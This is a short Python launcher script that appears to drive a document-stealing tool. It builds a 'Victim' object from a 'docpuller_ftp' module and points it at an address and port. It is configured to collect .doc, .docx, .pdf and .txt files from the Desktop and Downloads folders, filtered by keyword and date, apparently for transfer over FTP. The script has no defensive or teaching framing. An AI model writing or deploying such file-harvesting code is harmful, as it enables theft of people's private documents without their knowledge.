

from docpuller_scripts.docpuller_ftp.victim_ftp import Victim

def main():

    docPuller = Victim("192.168.1.1", 1101, ['Desktop', 'Downloads'], ('.doc', '.docx', '.pdf', '.txt'), ['nig'], ('2000-01-01', '2023-08-12'))

    docPuller.main()


if __name__ == '__main__':
    main()

                    